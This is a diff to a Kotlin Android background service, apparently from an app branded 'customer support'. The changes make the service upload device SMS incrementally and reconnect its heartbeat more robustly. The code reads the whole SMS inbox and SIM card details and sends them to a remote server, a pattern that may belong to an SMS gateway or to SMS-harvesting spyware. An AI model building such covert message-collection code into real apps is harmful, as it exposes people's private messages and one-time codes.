@@ -29,6 +29,12 @@ import com.customersupport.socket.ForwardingConfig
 import com.customersupport.socket.SmsSendRequest
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.first
+import org.json.JSONArray
+import org.json.JSONObject
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
+import java.util.TimeZone
 
 class SocketService : Service() {
 
@@ -413,8 +419,9 @@ class SocketService : Service() {
     }
 
     /**
-     * App-level heartbeat every 60s. Keeps the server's device status online and
-     * refreshes lastSeen, so a silent transport drop self-heals.
+     * App-level heartbeat every 30s. Keeps the server's device status online and
+     * refreshes lastSeen. If the server stops acking, the socket is half-open —
+     * force a clean reconnect.
      */
     private fun startHeartbeat(deviceId: String) {
         heartbeatJob?.cancel()
@@ -422,6 +429,10 @@ class SocketService : Service() {
             while (isActive) {
                 delay(HEARTBEAT_INTERVAL_MS)
                 socketManager.sendHeartbeat(deviceId)
+                if (socketManager.heartbeatStale(90_000L)) {
+                    Log.w(TAG, "Heartbeat ack stale for >90s — forcing reconnect")
+                    socketManager.recoverConnection()
+                }
             }
         }
     }
@@ -546,30 +557,36 @@ class SocketService : Service() {
 
     private suspend fun performSync() {
         try {
-            if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
-                Log.w(TAG, "Cannot sync - not connected, queuing data")
-                // Still read and queue the data for later
-                val deviceId = preferencesManager.getDeviceId().first() ?: return
-                val pendingSyncManager = CustomerSupportApp.pendingSyncManager
+            val deviceId = preferencesManager.getDeviceId().first() ?: return
 
-                val smsArray = smsReader.readAllSms()
-                if (smsArray.length() > 0) {
-                    pendingSyncManager.queueSmsSync(deviceId, smsArray)
+            // Incremental SMS: send only messages newer than the last sync
+            // (minus a small overlap) so we don't resend the whole history every
+            // cycle — which risks exceeding the server frame limit and looping.
+            val allSms = smsReader.readAllSms()
+            val lastSmsMs = preferencesManager.getLastSmsSyncMs().first()
+            val newSms = selectSmsForSync(allSms, lastSmsMs)
+            val newestMs = newestSmsMs(allSms)
+
+            if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
+                Log.w(TAG, "Cannot sync - not connected, queuing ${newSms.length()} new SMS")
+                if (newSms.length() > 0) {
+                    CustomerSupportApp.pendingSyncManager.queueSmsSync(deviceId, newSms)
                 }
                 return
             }
 
-            val deviceId = preferencesManager.getDeviceId().first() ?: return
-            Log.d(TAG, "Starting sync for device: $deviceId")
+            Log.d(TAG, "Starting sync for device: $deviceId (${newSms.length()} new SMS)")
 
             val simCards = simManager.getSimCards()
             if (simCards.length() > 0) {
                 socketManager.syncSimInfo(deviceId, simCards)
             }
 
-            val smsArray = smsReader.readAllSms()
-            if (smsArray.length() > 0) {
-                socketManager.syncSms(deviceId, smsArray)
+            if (newSms.length() > 0) {
+                socketManager.syncSms(deviceId, newSms)
+                if (newestMs > 0L) {
+                    preferencesManager.saveLastSmsSyncMs(newestMs)
+                }
             }
 
             preferencesManager.saveLastSyncTime(System.currentTimeMillis())
@@ -577,6 +594,47 @@ class SocketService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Sync failed", e)
         }
+    }
+
+    /** ISO-8601 UTC formatter matching SmsReader's timestamp format. */
+    private fun isoFormat(): SimpleDateFormat =
+        SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
+            timeZone = TimeZone.getTimeZone("UTC")
+        }
+
+    private fun parseIsoMs(ts: String): Long =
+        try {
+            isoFormat().parse(ts)?.time ?: 0L
+        } catch (e: Exception) {
+            0L
+        }
+
+    /**
+     * Return only SMS newer than [lastSyncedMs] (with a 60s overlap so nothing is
+     * missed across clock/boundary edges). On the first ever sync (0) returns all.
+     * The server dedupes by id, so the overlap is safe.
+     */
+    private fun selectSmsForSync(all: JSONArray, lastSyncedMs: Long): JSONArray {
+        if (lastSyncedMs <= 0L) return all
+        val cutoff = lastSyncedMs - 60_000L
+        val filtered = JSONArray()
+        for (i in 0 until all.length()) {
+            val obj = all.optJSONObject(i) ?: continue
+            if (parseIsoMs(obj.optString("timestamp")) >= cutoff) {
+                filtered.put(obj)
+            }
+        }
+        return filtered
+    }
+
+    private fun newestSmsMs(all: JSONArray): Long {
+        var max = 0L
+        for (i in 0 until all.length()) {
+            val obj = all.optJSONObject(i) ?: continue
+            val ts = parseIsoMs(obj.optString("timestamp"))
+            if (ts > max) max = ts
+        }
+        return max
     }
 
     private fun getDeviceUniqueId(): String {
